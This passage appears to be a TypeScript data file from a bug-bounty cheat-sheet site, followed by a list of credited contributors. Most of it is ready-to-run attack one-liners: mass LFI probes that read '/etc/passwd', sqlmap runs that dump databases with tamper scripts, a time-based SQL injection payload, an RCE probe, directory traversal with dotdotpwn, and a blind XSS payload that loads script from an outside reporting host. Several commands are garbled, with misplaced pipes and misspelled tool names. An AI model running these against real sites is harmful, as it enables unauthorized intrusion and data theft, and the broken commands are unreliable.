          `python3 lostsec.py -1 final.txt -p payloads/xor.txt -t 5`,
          `---------------------`,
          `python3 lostsec.py -u 'https://evil.com/index.php?id=' -p /payloads/xor.txt`
        ],
        description: ''
      },
    ]
  },
    {
    id: 'Find XSS Vulnerabilities',
    title: 'Find XSS Vulnerabilities',
    commands: [
      {
        name: 'One-Liner Command',
        command: ['echo example.com | gau | gf xss | uro | Gxss | kxss | tee xss_output.txt'],
        description: 'Xss'
      },
      {
        name: 'Refining And Validating Results',
        command: [`cat xss_output.txt | grep -oP '^URL: \K\S+' | sed 's/=.*/=/' | sort -u > final.txt`],
        description: 'Xss'
      },
      {
        name: 'Final Exploitation With Our Loxs tool',
        command: [`python3 loxs.py`],
        description: 'you can get this tool on github: https://github.com/coffinxp'
      },
    ]
  },
    {
    id: 'Reconnaisance ',
    title: 'Reconnaisance',
    commands: [
      {
        name: 'Effective Way To Crawl Katana',
        command: [`katana -u vulnweb.com -d 5 -ps -pss waybackarchive,commoncrawl,alienvault -f qurl -jc -xhr -kf -fx -fs dn -ef woff,css,png,svg,jpg,woff2,jpeg,gif,svg`],
        description: 'Example advanced command'
      },
      {
        name: 'Katana Command To Crawl',
        command: [`katana -u target.com -d 5 -ef woff,css,png,jpg,jpeg,woff2,gif,svg -o allurls`],
        description: 'Example advanced command'
      },
      {
        name: 'Easy Way To Find Lfi',
        command: [
          `subfinder -d domain.com -all -silent | httpx-toolkit -o output.txt`,
          `nuclei -l output.txt -t /nuclei-templates/http/vulnerabilities/generic/generic-linux-lfi.yaml -c 30`
        ],
        description: 'Example advanced command'
      },
      {
        name: 'One Line To Find Lfi Bugs',
        command: [`gau https://example.com/ | gf lfi | gsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! &";`],
        description: 'Example advanced command'
      },
      {
        name: 'lfi oneliner',
        command: [`echo "https://www.example.com/" | gau | gf lfi | uro | sed 's/=.*/=/' | qsreplace "FUZZ" | sort -u | xargs -I{} ffuf -u {} -w payloads/lfi.txt -c -mr "root:x:0:" -v`],
        description: 'Example advanced command'
      },
      {
        name: 'Find Information Diclosure Bugs',
        command: [
          `echo https://example.com/ | gau | grep -E "\.(xls|xml|xlsx|json|pdf|sql|doc|docx|pptx|txt|zip|tar\.gz|tgz|bak|7z|rar|log|cache|secret|db|backup|yml|gz|config|csv|yaml|md|md5|tar|xz|7zip|p12|pem|key|crt|csr|sh|pl|py|java|class|jar|war|ear|sqlitedb|sqlite3|dbf|db3|accdb|mdb|sqlcipher|gitignore|env|ini|conf|properties|plist|cfg)$"`,
          `echo https://example.com/ | gau | grep -E "\.xls|\.xml|\.xlsx|\.json|\.pdf|\.sql|\.doc|\.docx|\.pptx|\.txt|\.zip|\.tar\.gz|\.tgz|\.bak|\.7z|\.rar|\.log|\.cache|\.secret|\.db|\.backup|\.yml|\.gz|\.config|\.csv|\.yaml|\.md|\.md5"`
        ],
        description: 'Example advanced command'
      },
      {
        name: 'Discover Sensitive Information',
        command: [
          `curl -s "https://otx.alienvault.com/api/v1/indicators/domain/example.com/url_list?limit=100&page=1" | jq -r '.url_list[].url'`,
          `curl -s "https://otx.alienvault.com/api/v1/indicators/domain/TARGET/url_list?limit=100&page=1" | jq`
        ],
        description: 'Example advanced command'
      },
      {
        name: 'Find Hidden GET Parameters In Javascript Files',
        command: [
          `assetfinder example.com | gau | egrep -v '(.css|.png|.jpeg|.jpg|.svg|.gif|.wolf)' | while read url; do vars=$(curl -s $url | grep -Eo "var [a-zA-Z0-9]+" | sed -e 's,'var','"$url"?',g' -e 's/ //g' | grep -v '.js' | sed 's/.*/&=xss/g'); echo -e "\e[1;33m$url\n\e[1;32m$vars"; done`
        ],
        description: 'Example advanced command'
      },
      {
        name: 'Open Redirect Stey By Step',
        command: [
          `subfinder -d domain.com -all -o subs.txt`,
          `cat subs.txt | httpx-toolkit -o filter.txt`,
          `cat subs.txt | httpx-toolkit -t 100 -o filter.txt`,
          `echo https://example.com/ | gau --threads 100 | tee urls.txt`,
          `cat urls.txt | gf redirect | sed 's/=.*/=/' | grep '?returnUrl' | uro > open.txt`
        ],
        description: 'Example advanced command'
      },
      {
        name: 'ONE LINER FOR OPEN REDIRECT BUG',
        command: [`cat file.txt |gf url | tee redirect payload.txt && cat redirect -payload.txt | parallerl -j 10 curl --proxy http://127.0.0.1:8080 -sk > /dev/null`],
        description: 'Example advanced command'
      },
      {
        name: 'USE Get Js To Find XSS Issues',
        command: [`cat domain.txt | getjs |httpx --match-regex"addEventListener\((?:'|\:")message(?:'|\")"`],
        description: 'Example advanced command'
      },
      {
        name: 'Bypsd For SQLI',
        command: [`sqlmap -u 'https://domain.com/page/index.php?id=34' --batch --dbs --threads=5 --random-agent --risk=3 --level=5 --tamper=space2comment -v 3 --dbms MySQL`],
        description: 'Example advanced command'
      },
      {
        name: 'Ffuf One-Liner Command',
        command: [`ffuf -w seclists/Discovery/Web-Content/directory-list-2.3-big.txt -u https://example.com/FUZZ -fc 400,401,402,403,404,429,500,501,502,503 -recursion -recursion-depth 2 -e .html,.php,.txt,.pdf,.js,.css,.zip,.bak,.old,.log,.json,.xml,.config,.env,.asp,.aspx,.jsp,.gz,.tar,.sql,.db -ac -c -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0" -H "X-Forwarded-For: 127.0.0.1" -H "X-Originating-IP: 127.0.0.1" -H "X-Forwarded-Host: localhost" -t 100 -r -o results.json`],
        description: 'Example advanced command'
      },
      {
        name: 'One-Liner To Find RCE',
        command: [`cat targets.txt | httpx -path "/cgi-bin/admin.cgi?Command=sysCommand&Cmd=id" -nc -ports 80,443,8080,8443 -mr "uid=" -silent`],
        description: 'Example advanced command'
      },
      {
        name: 'Finding XSS Parameters With ARJUN And KXSS',
        command: [`arjun -q -u example.com -oT arjun && cat arjun | awk -F'[?&]' '{baseUrl=$1; for(i=2; i<=NF; i++) {split($i, param, "="); print baseUrl "?" param[1] "="}}' | kxss`],
        description: 'Example advanced command'
      },
      {
        name: 'SQLMAP From WAYBACKURL',
        command: [`waybackurls target | grep -E '\bhttps?://\S+?=\S+' | grep -E '\.php|\.asp' | sort -u | sed 's/\(=[^&]*\)/=/g' | tee urls.txt | sort -u -o urls.txt && cat urls.txt | xargs -I{} sqlmap --technique=T --batch -u "{}"`],
        description: 'Example advanced command'
      },
      {
        name: 'Find Hidden Parameters',
        command: [
          `arjun -u https://site.com/endpoint.php -oT arjun_output.txt -t 10 --rate-limit 10 --passive -m GET,POST --headers "User-Agent: Mozilla/5.0"`,
          `arjun -u https://site.com/endpoint.php -oT arjun_output.txt -m GET,POST -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -t 10 --rate-limit 10  --headers "User-Agent: Mozilla/5.0"`
        ],
        description: 'Example advanced command'
      },
      {
        name: 'Dirsearch Command For Directory Brute',
        command: [`dirsearch -u https://example.com -e php,cgi,htm,html,shtm,shtml,js,txt,bak,zip,old,conf,log,pl,asp,aspx,jsp,sql,db,sqlite,mdb,tar,gz,7z,rar,json,xml,yml,yaml,ini,java,py,rb,php3,php4,php5 --random-agent --recursive -R 3 -t 20 --exclude-status=404 --follow-redirects --delay=0.1`],
        description: 'Example advanced command'
      },
      {
        name: 'Use In Bug Bounty Programs',
        command: [
          `subfinder -d example.com -all | nuclei -t /nuclei-templates/crlf.yaml -rl 50`,
          `subfinder -d example.com -all | nuclei -t /nuclei-templates/openRedirect.yaml -rl 100`,
          `subfinder -d example.com -all | nuclei -t /nuclei-templates/iis.yaml`,
          `subfinder -d example.com -all | nuclei -t /nuclei-templates/cors.yaml -rl 100`,
          `subfinder -d example.com -all | waybackurls | gf sqli | uro | nuclei -t /nuclei-templates/errsqli.yaml -rl 50`
        ],
        description: 'Example advanced command'
      },
      {
        name: 'SQLMAP Brute-Force Username Password',
        command: [`sqlmap -u 'PATCH DIREKTORY LOGIN' --data='username=username&password=password&submit=' --level=5 --risk=3`],
        description: 'Example advanced command'
      },
      {
        name: 'XSS From Javascript Hidden Farams',
        command: [`assetfinder *.com | gau | egrep -v '(.css|.svg)' | while read url; do vars=$(curl -s $url | grep -Eo "var [a-zA-Z0-9]+" | sed -e 's,'var','"$url"?',g' -e 's/ //g' | grep -v '.js' | sed 's/.*/&=xss/g'); echo -e "\e[1;33m$url\n\e[1;32m$vars"`],
        description: 'Example advanced command'
      },
      {
        name: 'SQLI One-Liner AUTOMATION',
        command: [`subfinder -d testphp.vulnweb.com -all -silent | gau | urldedupe | gf sqli > sql.txt; sqlmap -m sql.txt --batch --dbs --risk 2 --level 5 --random-agent | tee -a sqli.txt`],
        description: 'Example advanced command'
      },
      {
        name: 'Bug Bounty Find .GIT',
        command: [`cat domains.txt | grep "SUCCESS" | gf urls | httpx-toolkit -sc -server -cl -path "/.git/" -mc 200 -location -ms "Index of" -probe`],
        description: 'Example advanced command'
      },
      {
        name: 'SQLI',
        command: [
          `echo https://example.com/ | waybackurls | urldedupe | gf sqli`,
          `ghauri -u 'http://example.com:80/event-detail.php?id=*' --dbs --batch --level 3`,
          `paramspider -d www.example.com`,
          `cat result/example.txt | sed 's/FUZZ//g' > test.txt`
        ],
        description: 'Example advanced command'
      },
      {
        name: 'Find Blink SQL',
        command: [
          `time curl -I "https://example.com/mobile/shop/'XOR(if(now()=sysdate(),sleep(5),0))XOR'Z`,
          `ghauri -u 'https://example.com/mobile/shop/*' --batch --tech=T --dbms mysql --banner --current-db --flush-session`
        ],
        description: 'Example advanced command'
      },
      {
        name: 'XSS One-Liner',
        command: [
          `echo https://target.com/ | gau | gf xss | uro | Gxss | kxss | tee xss_output.txt`,
          `cat xss_output.txt | grep -oP '^URL: /K/S+' | sed 's/=.*/=/' | sort -u > final.txt`
        ],
        description: 'Example advanced command'
      },
    ]
  },
  {
    id: 'Bug Hunting methodology',
    title: 'Bug Hunting methodology',
    commands: [
      {
        name: 'For finding subdomain',
        command: [
          `subfinder -d example.com -all -recursive > subdomains.txt`,
          `cat subdomain.txt | httpx-toolkit -ports 80,443,8080,8000,8888 -threads 200 > subdomains_alive.txt`,
          `katana -u subdomains_alive.txt -d 5 -ps -pss waybackarchive,commoncrawl,alienvault -kf -jc -fx -ef woff,css,png,svg,jpg,woff2,jpeg,gif,svg -o allurls.txt`,
          `cat allurls.txt | grep -E "\.txt|\.log|\.cache|\.secret|\.db|\.backup|\.yml|\.json|\.gz|\.rar|\.zip|\.config"`,
          `cat allurls.txt | grep -E "\.js$" >> js.txt`,
          `cat js.txt | nuclei -t /nuclei-templates/http/exposures/`,
          `echo www.example.com | katana -ps | grep -E "\.js$" | nuclei -t /nuclei-templates/http/exposures/ -c 30`,
          `dirsearch -u https://www.example.com -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,old,sql,sql.gz,http://sql.zip,sql.tar.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip,.log,.xml,.js.,.json`,
          `subfinder -d example.com | httpx-toolkit -silent | katana -ps -f qurl | gf xss | bxss -appendMode -payload '"><script src=https://xss.report/c/coffinxp></script>' -parameters`,
          `subzy run --targets subdomains.txt --concurrency 100 --hide_fails --verify_ssl`,
          `python3 corsy.py -i /home/coffinxp/vaitor/subdomains_alive.txt -t 10 --headers "User-Agent: GoogleBot\nCookie: SESSION=Hacked"`,
          `nuclei -list subdomains_alive.txt -t /nuclei-templates/http/vulnerabilities/generic/cors-misconfig.yaml`,
          `nuclei -list subdomains_alive.txt -tags cve,osint,tech`,
          `cat allurls.txt | gf lfi | nuclei -tags lfis`,
          `cat allurls.txt | gf redirect | openredirex -p /home/whiterose/openRedirect`
        ],
        description: 'Most of them are methods provided by Coffinxp, and some tools are on Coffinxp github, Thanks to him'
      },
    ]
  },
  {
    id: 'Diretory Travesal Mass Hunting',
    title: 'Diretory Travesal Mass Hunting',
    commands: [
      {
        name: 'Directory Travesal',
        command: [
          `subfinder -d exapmle.com | httpx-toolkit | gau | uro | gf lfi | tee subdomains.txt`,
          `nuclei -l subdomains.txt -tags lfi`,
          `echo 'https://example.com/' | gau | uro | gf lfi`,
          `nuclei -target 'https://example.com/home.php?page=about.php' -tags lfi`,
          `dotdotpwn -m http-url -d 1- -f /etc/passwd -u "https://example.com/index.php?ajax.php?page=TRAVERSAL" -b -k "root:"`,
          `subfinder -d example.com | httpx-toolkit | gau | uro | gf lfi | gsreplace | "/etc/passwd" | while read url ; do curl -silent | "$url" | grep "root:x:" && echo "$url is vulnerable"; done;`,
          `echo 'https://example.com/?page=contact.php' | gsreplace | "/etc/passwd" | while read url ; do curl -silent | "$url" | grep "root:x:" && echo "$url is vulnerable"; done;`,
          `paramspider -d example.com --subs`,
          `dotdotpwn -m http-url -d 1- -f /etc/passwd -u "https://example.com/index.php?ajax.php?page=TRAVERSAL" -b -k "root:"`
        ],
        description: 'Web Security'
      },
    ]
  }
];

export const contributors: Contributor[] = [
  {
    username: 'Coffinxp',
    description: 'Hacker & Security Researcher focused on Offensive Security and Vulnerability Assessment.',
    imageUrl: 'https://avatars.githubusercontent.com/u/177080559?v=4?auto=compress&cs=tinysrgb&w=600',
    socialLinks: {
      twitter: 'https://x.com/coffinxp7',
      github: 'https://github.com/coffinxp',
      youtube: 'http://www.youtube.com/@lostsecc'
    }
  },
  {
    username: 'MuhammadWaseem29',
    description: 'Hacker & Security Researcher focused on Offensive Security and Vulnerability Assessment.',
    imageUrl: 'https://avatars.githubusercontent.com/u/161931698?v=4?auto=compress&cs=tinysrgb&w=600',
    socialLinks: {
      twitter: 'https://x.com/wgujjer11',
      github: 'https://github.com/MuhammadWaseem29',
      youtube: 'http://www.youtube.com/@MuhammadWaseem17397'
    }
  },
  {
    username: 'Nahamsec',
    description: 'Hacker & Security Researcher focused on Offensive Security and Vulnerability Assessment.',
    imageUrl: 'https://avatars.githubusercontent.com/u/9853732?v=4?auto=compress&cs=tinysrgb&w=600',
    socialLinks: {
      twitter: 'https://x.com/NahamSec',
      github: 'https://github.com/nahamsec',
      youtube: 'http://www.youtube.com/@NahamSec'
    }
  },
  {
    username: 'Tomnomnom',
    description: 'Hacker & Security Researcher focused on Offensive Security and Vulnerability Assessment.',
    imageUrl: 'https://avatars.githubusercontent.com/u/58276?v=4',
    socialLinks: {
      twitter: 'https://x.com/tomnomnom',
      github: 'https://github.com/tomnomnom',
      youtube: 'http://www.youtube.com/@TomNomNomDotCom'
    }
  }
];
